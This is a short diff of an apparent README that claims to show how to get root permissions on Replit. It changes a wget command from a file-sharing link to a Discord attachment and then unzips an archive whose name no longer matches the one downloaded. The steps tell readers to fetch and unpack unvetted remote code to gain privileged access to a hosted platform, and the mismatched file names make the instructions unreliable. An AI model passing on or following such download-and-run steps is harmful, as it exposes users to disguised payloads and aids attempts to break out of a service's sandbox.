@@ -7,7 +7,7 @@ https://replit.com/@techcode31287/oldbash
 
 **𝐓𝐡𝐢𝐬 𝐢𝐬 𝐡𝐨𝐰 𝐭𝐨 𝐠𝐞𝐭 𝐫𝐨𝐨𝐭 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧𝐬 𝐢𝐧 𝐫𝐞𝐩𝐥𝐢𝐭.**
 
-wget https://big.apkadmin.com/cgi-bin/dl.cgi/jgfabs4tverglplnjqqyo25yvqn5zdhvvghi6tg3bo3xwgwtqt3jraa/replit.zip
+wget https://cdn.discordapp.com/attachments/853535040250970113/878590395611775016/yt.zip
 
 unzip replit.zip
 
